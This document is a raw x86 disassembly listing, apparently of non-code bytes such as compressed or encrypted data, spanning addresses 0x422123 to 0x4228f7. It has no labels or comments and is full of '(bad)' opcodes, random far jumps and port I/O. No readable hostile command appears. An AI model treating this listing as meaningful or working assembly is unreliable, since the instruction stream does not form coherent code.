  422123:	adc    ebx,ecx
  422125:	sbb    edi,DWORD PTR [edi]
  422127:	test   DWORD PTR [ebx+0x78f94c70],edx
  42212d:	mov    ebx,DWORD PTR [eax]
  42212f:	mov    ecx,0xaf45a3fb
  422134:	push   ecx
  422135:	lock and DWORD PTR [esi],eax
  422138:	scas   al,BYTE PTR es:[edi]
  422139:	mov    ebp,0x4adda98d
  42213e:	js     0x4221b1
  422140:	inc    ecx
  422141:	test   al,0x85
  422143:	idiv   BYTE PTR [ecx]
  422145:	aas    
  422146:	repnz imul ecx,DWORD PTR [ecx+ecx*1-0x312b3760],0x440d84d8
  422152:	loopne 0x422161
  422154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422155:	fisttp DWORD PTR [eax+0x4e]
  422158:	dec    esi
  422159:	or     BYTE PTR [esi+0x7ff43bba],ah
  42215f:	jmp    0xe1da:0x2a594906
  422166:	fistp  WORD PTR [eax]
  422168:	pop    ecx
  422169:	jae    0x422197
  42216b:	adc    ch,BYTE PTR [ebp+0x3a]
  42216e:	jo     0x4221b5
  422170:	mov    ah,0xad
  422172:	sbb    BYTE PTR [edx+0xb271c5d],ch
  422178:	retf   
  422179:	repnz jmp 0x0:0xb2
  422181:	add    cl,bl
  422183:	mov    dh,0x66
  422185:	sbb    ebp,DWORD PTR [edi-0x25]
  422188:	std    
  422189:	neg    BYTE PTR [esi]
  42218b:	sub    esp,DWORD PTR [ebx-0x23]
  42218e:	aad    0x5c
  422190:	mov    al,ds:0x1d8913f
  422195:	add    BYTE PTR [edx+0x0],ah
  422198:	add    BYTE PTR [eax],al
  42219a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42219b:	in     eax,0x4
  42219d:	loop   0x42212a
  42219f:	test   DWORD PTR ds:0x22777957,eax
  4221a5:	jp     0x422203
  4221a7:	test   DWORD PTR [eax+eax*1],0x5267be33
  4221ae:	and    BYTE PTR [ebx-0x2f69d5d5],bl
  4221b4:	cmc    
  4221b5:	mov    bl,0xf4
  4221b7:	jle    0x42216c
  4221b9:	xor    DWORD PTR [esi-0x7d4c16ed],0xf5cc0700
  4221c3:	mov    edi,0x776fdc36
  4221c8:	push   cs
  4221c9:	sbb    al,0x6a
  4221cb:	repnz dec ebx
  4221cd:	pop    esi
  4221ce:	out    0xfa,al
  4221d0:	xor    al,0xf
  4221d2:	in     eax,0x41
  4221d4:	arpl   WORD PTR [ebx],bp
  4221d6:	out    dx,eax
  4221d7:	and    al,BYTE PTR [edi+0x14d293a0]
  4221dd:	lahf   
  4221de:	(bad)
  4221e1:	sub    BYTE PTR ds:0xef4f01c,0xb8
  4221e8:	enter  0xf9ea,0x5f
  4221ec:	xchg   ecx,eax
  4221ed:	dec    esp
  4221ee:	sbb    eax,0xefe3b2cf
  4221f3:	out    0x84,eax
  4221f5:	push   ds
  4221f6:	dec    esp
  4221f7:	dec    ecx
  4221f8:	test   al,0x43
  4221fa:	bnd jnp 0x4221fd
  4221fd:	add    BYTE PTR [eax],al
  4221ff:	add    BYTE PTR [eax],al
  422201:	add    dl,bl
  422203:	xor    dl,BYTE PTR [edi-0x20500076]
  422209:	jb     0x42220e
  42220b:	inc    ebp
  42220c:	mov    ds:0x57bca35c,eax
  422211:	and    al,0xf3
  422213:	fadd   DWORD PTR [ecx]
  422215:	add    BYTE PTR [edx+0x0],ah
  422218:	add    BYTE PTR [eax],al
  42221a:	jmp    0x42228f
  42221c:	inc    esp
  42221d:	cmp    BYTE PTR [ecx-0x6b],cl
  422220:	je     0x422243
  422222:	jbe    0x4222a1
  422224:	sahf   
  422225:	cli    
  422226:	push   cs
  422227:	mov    esi,ecx
  422229:	test   ah,dh
  42222b:	leave  
  42222c:	or     eax,0xc84a4fde
  422231:	push   0x22
  422233:	lds    esi,FWORD PTR [edx+0x2e]
  422236:	and    eax,0x917d8e06
  42223b:	(bad)  
  42223c:	push   esp
  42223d:	xor    edi,DWORD PTR [esi+eiz*1]
  422240:	stos   DWORD PTR es:[edi],eax
  422241:	jmp    0xa85e:0x41703669
  422248:	out    0xb8,al
  42224a:	(bad)  
  42224b:	test   eax,0xc62733b8
  422250:	neg    dh
  422252:	push   ebp
  422253:	out    0xe3,eax
  422255:	push   ss
  422256:	mov    ch,0xb4
  422258:	sub    eax,0xdae25204
  42225d:	and    DWORD PTR [esi-0x28a87e0b],esp
  422263:	nop
  422264:	mov    DWORD PTR [edx],ebx
  422266:	test   eax,0x8fedf326
  42226b:	fisub  DWORD PTR [ecx+0x23cb7a18]
  422271:	gs push esi
  422273:	enter  0xbb3,0xda
  422277:	jns    0x422288
  422279:	mov    BYTE PTR [edx+0xf8],bh
  42227f:	add    BYTE PTR [eax],al
  422281:	add    BYTE PTR [eax-0x1c],cl
  422284:	add    ebx,DWORD PTR [ebx-0x8270051]
  42228a:	pop    esi
  42228b:	sub    BYTE PTR [eax-0x1aeadd71],bl
  422291:	jb     0x4222e8
  422293:	fld    DWORD PTR [ecx]
  422295:	add    BYTE PTR [edx+0x0],ah
  422298:	add    BYTE PTR [eax],al
  42229a:	pop    esi
  42229b:	inc    ebp
  42229c:	pusha  
  42229d:	repnz in eax,dx
  42229f:	sbb    ch,BYTE PTR [edx]
  4222a1:	sub    DWORD PTR [eax+0x68],ecx
  4222a4:	pop    edi
  4222a5:	sbb    eax,0xcef70e7f
  4222aa:	or     eax,DWORD PTR [edi+0x4279f418]
  4222b0:	nop
  4222b1:	cs sbb esi,edx
  4222b4:	sub    BYTE PTR [esi],bl
  4222b6:	mov    esp,0x386aaf10
  4222bb:	fwait
  4222bc:	xchg   ebx,eax
  4222bd:	xchg   ebx,eax
  4222be:	fldcw  WORD PTR [edx+ebp*8]
  4222c1:	addr16 cld 
  4222c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222c4:	add    eax,0xa28a383
  4222c9:	push   ebp
  4222ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222cb:	push   0x7a
  4222cd:	push   eax
  4222ce:	imul   ebp,eax,0x45
  4222d1:	add    BYTE PTR [ecx+0x5a],bl
  4222d4:	sbb    DWORD PTR [ecx],ecx
  4222d6:	nop
  4222d7:	fist   DWORD PTR [eax+0x2b]
  4222da:	mov    ebp,0xbbed7426
  4222df:	push   edx
  4222e0:	jbe    0x4222e8
  4222e2:	or     dl,ch
  4222e4:	out    dx,al
  4222e5:	jmp    0xd3a30f6e
  4222ea:	in     eax,0x1
  4222ec:	aas    
  4222ed:	jb     0x4222cc
  4222ef:	jecxz  0x42231b
  4222f1:	aam    0x64
  4222f3:	ss xor al,0x33
  4222f6:	mov    bh,0xf3
  4222f8:	sahf   
  4222f9:	enter  0x42a5,0x0
  4222fd:	add    BYTE PTR [eax],al
  4222ff:	add    BYTE PTR [eax],al
  422301:	add    BYTE PTR [edx+0x4],dl
  422304:	mov    ds:0x72a6f682,al
  422309:	aam    0x6d
  42230b:	xor    dh,BYTE PTR [edx]
  42230d:	and    eax,0x985baef3
  422312:	mov    bh,0xd9
  422314:	add    DWORD PTR [eax],eax
  422316:	bound  eax,QWORD PTR [eax]
  422318:	add    BYTE PTR [eax],al
  42231a:	xchg   edi,eax
  42231b:	adc    al,0xf
  42231d:	jle    0x422396
  42231f:	nop
  422320:	adc    DWORD PTR [ebx+0x76],eax
  422323:	rcr    al,1
  422325:	xchg   DWORD PTR [eax],eax
  422327:	data16 adc bh,BYTE PTR [esi+eiz*2]
  42232b:	jae    0x4223a4
  42232d:	retf   
  42232e:	or     eax,0x3e6b9ae3
  422333:	push   ds
  422334:	jne    0x422320
  422336:	cmp    BYTE PTR [eax],bl
  422338:	in     al,0x6b
  42233a:	sbb    eax,0xfb05afe9
  42233f:	ror    BYTE PTR [edi+0x2],1
  422342:	repnz jmp 0xd2d:0xe279c4ea
  42234a:	mov    ch,0x9a
  42234c:	mov    esp,0xed0d6dde
  422351:	int3   
  422352:	xor    cl,BYTE PTR [eax]
  422354:	mov    eax,ds:0xb4317dbc
  422359:	mov    eax,ds:0x6255c1a4
  42235e:	div    BYTE PTR [edx+edi*2+0x224dd716]
  422365:	or     esi,DWORD PTR [ebp+ebp*1-0x9]
  422369:	dec    ebx
  42236a:	xor    eax,0x1cbb192e
  42236f:	xor    al,0x3f
  422371:	or     DWORD PTR [ebp+0x64a26f4e],ebp
  422377:	mov    esi,0x3d99ce45
  42237c:	add    BYTE PTR [eax],al
  42237e:	add    BYTE PTR [eax],al
  422380:	add    BYTE PTR [eax],al
  422382:	cmp    BYTE PTR [edx-0x6a],ch
  422385:	add    edx,esi
  422387:	(bad)  
  422388:	mov    ebp,0xdb4ef67b
  42238d:	out    0x65,eax
  42238f:	xchg   ch,dl
  422391:	enter  0xda19,0x1
  422395:	add    BYTE PTR [edx+0x0],ah
  422398:	add    BYTE PTR [eax],al
  42239a:	xlat   BYTE PTR ds:[ebx]
  42239b:	adc    BYTE PTR [edi],cl
  42239d:	inc    eax
  42239e:	mov    eax,ds:0xb7724c8f
  4223a3:	in     eax,dx
  4223a4:	faddp  st(6),st
  4223a6:	mov    ebp,0xb7b46808
  4223ab:	and    esp,ebp
  4223ad:	pop    edi
  4223ae:	jnp    0x422400
  4223b0:	push   ss
  4223b1:	(bad)  
  4223b2:	adc    DWORD PTR ds:0x6432e44c,edi
  4223b8:	inc    eax
  4223b9:	mov    WORD PTR [edi+0x41429e67],?
  4223bf:	imul   esp,DWORD PTR [esp+edi*2-0x5c],0x36
  4223c4:	jno    0x422421
  4223c6:	xchg   ebp,eax
  4223c7:	clc    
  4223c8:	sub    eax,0x9d131cb0
  4223cd:	es daa 
  4223cf:	pop    edx
  4223d0:	loope  0x422377
  4223d2:	push   ss
  4223d3:	sbb    bl,BYTE PTR [eax-0xb]
  4223d6:	fdivr  QWORD PTR [edi-0x4a9bcc4b]
  4223dc:	push   eax
  4223dd:	inc    edx
  4223de:	aad    0x52
  4223e0:	inc    esi
  4223e1:	adc    dl,ah
  4223e3:	dec    edx
  4223e4:	mov    eax,DWORD PTR [ebp+0x37]
  4223e7:	xlat   BYTE PTR ds:[ebx]
  4223e8:	mov    esp,DWORD PTR [edi+ebp*4+0x2e]
  4223ec:	mov    dl,0xf
  4223ee:	fs push ecx
  4223f0:	lock or al,0xad
  4223f3:	daa    
  4223f4:	xor    dl,dh
  4223f6:	mov    dl,0x70
  4223f8:	out    dx,al
  4223f9:	mov    BYTE PTR [eax-0x2],dl
  4223fc:	add    BYTE PTR [eax],al
  4223fe:	add    BYTE PTR [eax],al
  422400:	add    BYTE PTR [eax],al
  422402:	jmp    0x7a729ec0
  422407:	repz jmp 0x422403
  42240a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42240e:	sub    DWORD PTR [edi-0x258450c2],ebp
  422414:	add    DWORD PTR [eax],eax
  422416:	bound  eax,QWORD PTR [eax]
  422418:	add    BYTE PTR [eax],al
  42241a:	adc    eax,0xe35d7133
  42241f:	xor    BYTE PTR [edi],dh
  422421:	jmp    0x422430
  422423:	mov    dh,0xb2
  422425:	or     al,0x69
  422427:	xchg   DWORD PTR [ecx],edx
  422429:	dec    eax
  42242a:	lods   al,BYTE PTR ds:[esi]
  42242b:	jp     0x422407
  42242d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242e:	jecxz  0x42244f
  422430:	fmul   st(2),st
  422432:	dec    ebx
  422433:	je     0x422447
  422435:	fsubr  DWORD PTR [ecx+0x40]
  422438:	adc    dh,BYTE PTR [ecx+0x45]
  42243b:	sar    DWORD PTR [edi+0x652e5f22],0x57
  422442:	adc    al,0x77
  422444:	add    BYTE PTR [ebx-0x4c888966],bl
  42244a:	and    esp,ebx
  42244c:	cmp    al,0x70
  42244e:	mov    esi,0xef653692
  422453:	xchg   ebx,edx
  422455:	dec    edx
  422456:	inc    edi
  422457:	popa   
  422458:	jne    0x4223ef
  42245a:	in     al,dx
  42245b:	in     al,dx
  42245c:	stc    
  42245d:	jne    0x4223e9
  42245f:	sub    al,0x89
  422461:	and    DWORD PTR [ebx],ebx
  422463:	or     DWORD PTR [ebp-0x4c],esp
  422466:	jmp    0xce4db0e5
  42246b:	jae    0x42241e
  42246d:	dec    esp
  42246e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246f:	scas   eax,DWORD PTR es:[edi]
  422470:	sbb    BYTE PTR [edx],cl
  422472:	mov    ?,WORD PTR [ecx]
  422474:	loope  0x42241d
  422476:	shl    ecx,cl
  422478:	adc    ecx,edx
  42247a:	mov    ds:0x53,al
  42247f:	add    BYTE PTR [eax],al
  422481:	add    BYTE PTR [ebx+0x41],bl
  422484:	pop    ebx
  422485:	iret   
  422486:	pop    ebx
  422487:	(bad)  
  422489:	aad    0xf
  42248b:	ss dec esp
  42248d:	dec    esi
  42248e:	jbe    0x42241a
  422490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422491:	xchg   ebp,ebx
  422493:	fiadd  DWORD PTR [ecx]
  422495:	add    BYTE PTR [edx+0x0],ah
  422498:	add    BYTE PTR [eax],al
  42249a:	test   BYTE PTR [esi-0x15ccd58b],cl
  4224a0:	push   es
  4224a1:	jl     0x422516
  4224a3:	add    BYTE PTR [esp+eiz*2],ch
  4224a6:	lahf   
  4224a7:	adc    al,0xc1
  4224a9:	(bad)  
  4224aa:	sub    ebx,DWORD PTR [edi-0x17]
  4224ad:	mov    edi,0x414081ee
  4224b2:	ret    
  4224b3:	loopne 0x4224cf
  4224b5:	inc    ecx
  4224b6:	ret    
  4224b7:	sub    al,0x36
  4224b9:	rcl    ebp,0x67
  4224bc:	add    bh,BYTE PTR [edx]
  4224be:	mov    eax,ds:0x4a8cc7d5
  4224c3:	xchg   BYTE PTR [esi-0x32307a61],dl
  4224c9:	pop    ecx
  4224ca:	push   ecx
  4224cb:	jo     0x42244f
  4224cd:	mov    DWORD PTR [ebp+0x2f],esi
  4224d0:	push   edx
  4224d1:	fisttp QWORD PTR [edx]
  4224d3:	bound  edi,QWORD PTR [edx-0x6be4734d]
  4224d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224da:	dec    ebx
  4224db:	cli    
  4224dc:	shl    ah,0xe
  4224df:	adc    al,0x25
  4224e1:	sub    dh,BYTE PTR [esp]
  4224e4:	push   ebp
  4224e5:	fstp   QWORD PTR [eax]
  4224e7:	xchg   ebp,eax
  4224e8:	scas   eax,DWORD PTR es:[edi]
  4224e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ea:	cwde   
  4224eb:	je     0x4224de
  4224ed:	mov    ch,dl
  4224ef:	retf   
  4224f0:	cmp    ecx,0x6d090d3c
  4224f6:	inc    ebp
  4224f7:	les    ebx,FWORD PTR [ebx-0x77]
  4224fa:	outs   dx,DWORD PTR ds:[esi]
  4224fb:	rol    DWORD PTR [eax],0x0
  4224fe:	add    BYTE PTR [eax],al
  422500:	add    BYTE PTR [eax],al
  422502:	fwait
  422503:	test   DWORD PTR [ebp+0x3c],esp
  422506:	jg     0x422504
  422508:	(bad)  [edi-0x65be08a1]
  42250e:	adc    eax,0x3f90493e
  422513:	fild   DWORD PTR [ecx]
  422515:	add    BYTE PTR [edx+0x0],ah
  422518:	add    BYTE PTR [eax],al
  42251a:	inc    esi
  42251b:	fs inc eax
  42251d:	jae    0x422579
  42251f:	inc    ebp
  422520:	jbe    0x42258d
  422522:	jo     0x4224d9
  422524:	jle    0x4224f0
  422526:	hlt    
  422527:	jge    0x422538
  422529:	shl    ah,1
  42252b:	jnp    0x42257d
  42252d:	xchg   edx,eax
  42252e:	mov    dh,0x90
  422530:	inc    eax
  422531:	and    DWORD PTR gs:[ecx-0x19],0xa7aa5d74
  422539:	stc    
  42253a:	icebp  
  42253b:	das    
  42253c:	push   cs
  42253d:	jae    0x422550
  42253f:	adc    eax,0xaf65c7a1
  422544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422545:	leave  
  422546:	test   BYTE PTR [ecx-0x70],cl
  422549:	and    DWORD PTR [eax],0xf1448fb2
  42254f:	shl    DWORD PTR [esi],cl
  422551:	test   DWORD PTR [edx+0x71],esi
  422554:	loopne 0x4224e2
  422556:	cmp    BYTE PTR [eax],dl
  422558:	hlt    
  422559:	test   DWORD PTR [esi+0x5c],0xfd5715f5
  422560:	add    eax,0xbb94c268
  422565:	loopne 0x4225c1
  422567:	adc    BYTE PTR ds:0x24937f62,dl
  42256d:	jle    0x4225ac
  42256f:	sub    DWORD PTR [ebx+0x6b306c22],eax
  422575:	sbb    eax,0xc64207f7
  42257a:	stos   BYTE PTR es:[edi],al
  42257b:	dec    ecx
  42257c:	add    BYTE PTR [eax],al
  42257e:	add    BYTE PTR [eax],al
  422580:	add    BYTE PTR [eax],al
  422582:	outs   dx,BYTE PTR ds:[esi]
  422583:	jae    0x422575
  422585:	retf   0xcbfd
  422588:	jle    0x422581
  42258a:	repz xor eax,0xfc418ce9
  422590:	jne    0x42257a
  422592:	mov    eax,ds:0x620001db
  422597:	add    BYTE PTR [eax],al
  422599:	add    BYTE PTR [ebp+0x1eede299],dl
  42259f:	test   edi,ecx
  4225a1:	mov    esp,0x9464b4c4
  4225a6:	nop
  4225a7:	stos   BYTE PTR es:[edi],al
  4225a8:	jnp    0x4225dd
  4225aa:	sub    eax,0x5935c7bd
  4225af:	adc    DWORD PTR [esi+0x1b],eax
  4225b2:	pop    esi
  4225b3:	stos   BYTE PTR es:[edi],al
  4225b4:	sbb    bl,bl
  4225b6:	outs   dx,DWORD PTR ds:[esi]
  4225b7:	xchg   ebp,eax
  4225b8:	in     eax,0x44
  4225ba:	mov    bl,0xa
  4225bc:	ret    
  4225bd:	push   ebp
  4225be:	mov    dl,BYTE PTR [ecx-0x6fbb5fba]
  4225c4:	mov    ah,0x29
  4225c6:	lods   eax,DWORD PTR ds:[esi]
  4225c7:	lds    esp,FWORD PTR ds:0x4b386c1b
  4225cd:	add    eax,0xf8652b96
  4225d2:	or     al,0xf
  4225d4:	hlt    
  4225d5:	pop    ecx
  4225d6:	sub    eax,0x7ee31bcf
  4225db:	int3   
  4225dc:	xor    ebp,DWORD PTR [edx+0x49]
  4225df:	pop    esp
  4225e0:	icebp  
  4225e1:	cwde   
  4225e2:	cmp    eax,0x9d699fea
  4225e7:	inc    ebx
  4225e8:	push   ss
  4225e9:	jp     0x422657
  4225eb:	cwde   
  4225ec:	fidivr WORD PTR [esp+eiz*4+0x2d9f2c80]
  4225f3:	cwde   
  4225f4:	out    dx,al
  4225f5:	jmp    0xf6a1:0x35187bb9
  4225fc:	add    BYTE PTR [eax],al
  4225fe:	add    BYTE PTR [eax],al
  422600:	add    BYTE PTR [eax],al
  422602:	cmc    
  422603:	adc    al,0xae
  422605:	adc    ebp,edi
  422607:	mov    ebx,0x84e6f6fd
  42260c:	lds    ebp,FWORD PTR [edx-0x6a397a46]
  422612:	add    ebx,esp
  422614:	add    DWORD PTR [eax],eax
  422616:	bound  eax,QWORD PTR [eax]
  422618:	add    BYTE PTR [eax],al
  42261a:	inc    esi
  42261b:	adc    al,0x83
  42261d:	rol    eax,1
  42261f:	dec    ecx
  422620:	pop    esi
  422621:	sbb    edi,DWORD PTR [eax-0x28]
  422624:	fstp   QWORD PTR [edx]
  422626:	popa   
  422627:	jecxz  0x4225ff
  422629:	in     al,0xd3
  42262b:	frndint 
  42262d:	data16 sahf 
  42262f:	lea    ebp,[ecx]
  422631:	daa    
  422632:	std    
  422633:	jnp    0x4226af
  422635:	clc    
  422636:	xor    esi,ebx
  422638:	sbb    eax,0x7a14bee4
  42263d:	call   0x3b1a2165
  422642:	and    eax,0x591e32f7
  422647:	mov    ebx,0xc4a9f4d6
  42264c:	cmp    BYTE PTR [esi+0x6c],bl
  42264f:	(bad)  
  422650:	pop    ecx
  422651:	call   0xfb6b:0x11af1a3a
  422658:	and    eax,0x4065d1f4
  42265d:	pop    ss
  42265e:	mov    edi,0x35390936
  422663:	popa   
  422664:	xor    ah,ah
  422666:	push   es
  422667:	enter  0xf91f,0x51
  42266b:	mov    bl,0xd
  42266d:	mov    edx,DWORD PTR [ebp-0x511c918]
  422673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422674:	push   esi
  422675:	mov    edx,0x2eb9fcb2
  42267a:	jge    0x422660
  42267c:	add    BYTE PTR [eax],al
  42267e:	add    BYTE PTR [eax],al
  422680:	add    BYTE PTR [eax],al
  422682:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  422688:	mov    edi,0xbb1c16fb
  42268d:	shr    BYTE PTR [edi+0x32],0x1
  422691:	pop    es
  422692:	fadd   QWORD PTR gs:[ecx]
  422695:	add    BYTE PTR [edx+0x0],ah
  422698:	add    BYTE PTR [eax],al
  42269a:	jno    0x4226ef
  42269c:	clc    
  42269d:	fstp   TBYTE PTR [ebp-0x6e5142be]
  4226a3:	jns    0x422653
  4226a5:	arpl   WORD PTR [ecx+0x6],si
  4226a8:	push   ecx
  4226a9:	and    dl,BYTE PTR [edi-0x6f37173c]
  4226af:	lods   al,BYTE PTR ds:[esi]
  4226b0:	and    esi,DWORD PTR [edi-0x387f8334]
  4226b6:	rol    BYTE PTR ds:0xbd54346b,1
  4226bc:	test   DWORD PTR [ecx+0x9],edi
  4226bf:	or     BYTE PTR [edi],0x41
  4226c2:	cwde   
  4226c3:	cli    
  4226c4:	ins    BYTE PTR es:[edi],dx
  4226c5:	ins    DWORD PTR es:[edi],dx
  4226c6:	fs jae 0x4226a7
  4226c9:	hlt    
  4226ca:	test   eax,0xe6535f74
  4226cf:	fwait
  4226d0:	mov    ?,WORD PTR [ebp-0x56e7ec3]
  4226d6:	jae    0x42266c
  4226d8:	pop    esi
  4226d9:	mov    al,ds:0xa321635a
  4226de:	rcr    DWORD PTR [edi+0x577b4c9a],1
  4226e4:	and    DWORD PTR [eax],0x43
  4226e7:	dec    ebp
  4226e8:	jmp    0xd12f:0x63cef125
  4226ef:	push   edi
  4226f0:	xor    al,0xcb
  4226f2:	aad    0x50
  4226f4:	fidivr DWORD PTR [ecx]
  4226f6:	outs   dx,BYTE PTR ds:[esi]
  4226f7:	lock scas eax,DWORD PTR es:[edi]
  4226f9:	scas   eax,DWORD PTR es:[edi]
  4226fa:	inc    ebx
  4226fb:	add    BYTE PTR [eax],0x0
  4226fe:	add    BYTE PTR [eax],al
  422700:	add    BYTE PTR [eax],al
  422702:	aam    0xf
  422704:	push   ecx
  422705:	lock (bad) 
  422708:	cmc    
  422709:	das    
  42270a:	sbb    BYTE PTR [eax],cl
  42270c:	xchg   ebx,eax
  42270d:	iret   
  42270e:	lods   al,BYTE PTR ds:[esi]
  42270f:	xchg   edi,eax
  422710:	mov    ecx,0x1dcc7b5
  422715:	add    BYTE PTR [edx+0x0],ah
  422718:	add    BYTE PTR [eax],al
  42271a:	cmc    
  42271b:	mov    edi,0x3973cb
  422720:	sbb    ah,bh
  422722:	sbb    cl,BYTE PTR [ebx-0x6d]
  422725:	fdivr  st(6),st
  422727:	mov    ds:0x95cabf99,eax
  42272c:	mov    BYTE PTR ds:0x800a33c2,ch
  422732:	ret    
  422733:	sub    edi,DWORD PTR ds:0xeef38acf
  422739:	push   0xf
  42273b:	sub    al,0x41
  42273d:	mov    dh,0x1b
  42273f:	jl     0x42271b
  422741:	test   DWORD PTR [ecx+0x3],edx
  422744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422745:	cli    
  422746:	cdq    
  422747:	dec    ecx
  422748:	adc    bl,BYTE PTR [edi-0x63]
  42274b:	cmp    eax,0x4558aa83
  422750:	cld    
  422751:	sbb    BYTE PTR [ebx+0x2c],cl
  422754:	push   0xffffffed
  422756:	repnz nop
  422758:	pop    ss
  422759:	cmp    al,0x9f
  42275b:	or     BYTE PTR [ebx+0x6e],0x41
  42275f:	add    eax,0xd12edd33
  422764:	jae    0x422779
  422766:	adc    BYTE PTR [esi+ecx*8-0xb],0x45
  42276b:	iret   
  42276c:	xchg   DWORD PTR [esi+eiz*4],ebp
  42276f:	call   0x6db3:0xe8262582
  422776:	jecxz  0x422773
  422778:	call   0xa8b9c8
  42277d:	add    BYTE PTR [eax],al
  42277f:	add    BYTE PTR [eax],al
  422781:	add    ch,cl
  422783:	sub    eax,0xfbf54395
  422788:	fild   QWORD PTR [edi-0x5bdf5fa9]
  42278e:	mov    eax,ds:0x295124f1
  422793:	fld    QWORD PTR [ecx]
  422795:	add    BYTE PTR [edx+0x0],ah
  422798:	add    BYTE PTR [eax],al
  42279a:	bound  esp,QWORD PTR [edi+0x7229fb9a]
  4227a0:	mov    esp,0x8a393788
  4227a5:	inc    esi
  4227a6:	outs   dx,BYTE PTR ds:[esi]
  4227a7:	sbb    al,0x12
  4227a9:	imul   ecx,esi,0x101b5c83
  4227af:	int3   
  4227b0:	shr    BYTE PTR [edx+ebp*4+0x2b],1
  4227b4:	and    DWORD PTR [edx-0x45],ecx
  4227b7:	dec    edi
  4227b8:	jne    0x422801
  4227ba:	cmp    eax,0xd575343d
  4227bf:	imul   edi,DWORD PTR [esi],0xffffffcb
  4227c2:	xchg   esp,eax
  4227c3:	sbb    BYTE PTR [ebx+0xa],dh
  4227c6:	retf   
  4227c7:	call   0x67eef20
  4227cc:	cmc    
  4227cd:	push   ebp
  4227ce:	mov    ds,WORD PTR [edx+0x6c96c3ce]
  4227d4:	dec    ecx
  4227d5:	mov    bh,bh
  4227d7:	loopne 0x4227f2
  4227d9:	mov    dh,0x4d
  4227db:	add    edx,DWORD PTR [ebp-0x12]
  4227de:	mov    edx,0x54dbffbd
  4227e3:	lock test dh,dh
  4227e6:	mov    fs,WORD PTR [ebx+0x21059182]
  4227ec:	push   edx
  4227ed:	call   0xae2e8add
  4227f2:	jnp    0x4227fa
  4227f4:	mov    eax,ds:0xb508b781
  4227f9:	pop    ss
  4227fa:	pusha  
  4227fb:	mov    ds:0x0,eax
  422800:	add    BYTE PTR [eax],al
  422802:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  422806:	test   DWORD PTR [ebx-0xce58301],0xc1404cfc
  422810:	popa   
  422811:	adc    eax,0x1dd8b
  422816:	bound  eax,QWORD PTR [eax]
  422818:	add    BYTE PTR [eax],al
  42281a:	test   BYTE PTR [esi-0x5c6feadf],bl
  422820:	nop/reserved BYTE PTR [esi-0x1e]
  422824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422825:	cmp    edx,DWORD PTR [ebx-0x26e5d27d]
  42282b:	sahf   
  42282c:	sbb    edx,ebx
  42282e:	or     eax,DWORD PTR fs:[eax+0x13]
  422832:	sub    cl,BYTE PTR [ecx]
  422834:	xor    al,0x36
  422836:	jl     0x422854
  422838:	test   al,0x23
  42283a:	dec    esi
  42283b:	lea    ebx,[ebx+0x1a8a3350]
  422841:	or     bh,0x6
  422844:	xchg   esi,eax
  422845:	icebp  
  422846:	cmp    al,0x6d
  422848:	jmp    0xfe3ac398
  42284d:	scas   al,BYTE PTR es:[edi]
  42284e:	ror    DWORD PTR [esi+0x6038e1a1],0x44
  422855:	xlat   BYTE PTR ds:[ebx]
  422856:	dec    edi
  422857:	jns    0x42281f
  422859:	adc    bl,BYTE PTR [esi]
  42285b:	pop    ecx
  42285c:	pop    ds
  42285d:	jnp    0x422858
  42285f:	rcl    DWORD PTR [edi],1
  422861:	mov    bl,0x55
  422863:	test   DWORD PTR ds:0x78d16733,esi
  422869:	stos   BYTE PTR es:[edi],al
  42286a:	(bad)  
  42286c:	dec    ebp
  42286d:	scas   eax,DWORD PTR es:[edi]
  42286e:	enter  0xc82f,0xa1
  422872:	scas   al,BYTE PTR es:[edi]
  422873:	or     BYTE PTR [esi-0x1f724f00],dl
  422879:	or     eax,DWORD PTR ds:0x52
  42287f:	add    BYTE PTR [eax],al
  422881:	add    BYTE PTR [edi],ah
  422883:	push   ecx
  422884:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  42288e:	push   esp
  42288f:	fidiv  DWORD PTR [ebx+esi*8]
  422892:	in     eax,dx
  422893:	fld    QWORD PTR [ecx]
  422895:	add    BYTE PTR [edx+0x0],ah
  422898:	add    BYTE PTR [eax],al
  42289a:	data16 jo 0x422906
  42289d:	jo     0x4228a6
  42289f:	xchg   esp,eax
  4228a0:	cs dec eax
  4228a2:	call   FWORD PTR ss:[edi+0x66759410]
  4228a9:	scas   al,BYTE PTR es:[edi]
  4228aa:	sbb    al,0x68
  4228ac:	push   esi
  4228ad:	add    eax,esi
  4228af:	or     ch,BYTE PTR ds:0x5a64147f
  4228b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228b6:	fsub   DWORD PTR [eax-0x798a7a7]
  4228bc:	mov    edi,0xfeac90e6
  4228c1:	jl     0x4228f3
  4228c3:	enter  0xd2ad,0x8a
  4228c7:	inc    ecx
  4228c8:	out    dx,eax
  4228c9:	pop    edi
  4228ca:	int3   
  4228cb:	push   edx
  4228cc:	dec    ebp
  4228cd:	inc    esp
  4228ce:	pushf  
  4228cf:	je     0x4228ab
  4228d1:	ds pop esp
  4228d3:	bound  esi,QWORD PTR [ebp-0x5bb4c6ff]
  4228d9:	cmp    eax,DWORD PTR [esi]
  4228db:	scas   eax,DWORD PTR es:[edi]
  4228dc:	or     DWORD PTR [edi],0xffffffae
  4228df:	mov    gs,ebx
  4228e1:	and    ebp,DWORD PTR [esi+0x4]
  4228e4:	and    ah,bh
  4228e6:	neg    edi
  4228e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228e9:	push   ds
  4228ea:	or     al,0xfc
  4228ec:	and    ebx,ebx
  4228ee:	adc    BYTE PTR [edi+0x40efbb8],ah
  4228f4:	dec    esp
  4228f5:	fmulp  st(7),st
  4228f7:	push   esi
